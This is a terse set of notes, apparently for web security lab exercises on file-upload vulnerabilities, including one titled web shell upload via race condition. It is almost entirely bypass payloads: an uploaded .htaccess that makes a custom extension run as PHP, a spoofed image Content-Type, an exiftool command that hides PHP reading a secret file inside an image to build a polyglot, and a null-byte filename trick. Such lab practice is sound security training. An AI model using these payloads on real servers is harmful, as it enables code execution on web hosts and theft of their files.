========================
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .tez 

========================

Content-Type: image/jpeg

========================

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ink.png -o polyglot.php

========================

test.php%00.jpg

========================

Lab: Web shell upload via race condition

========================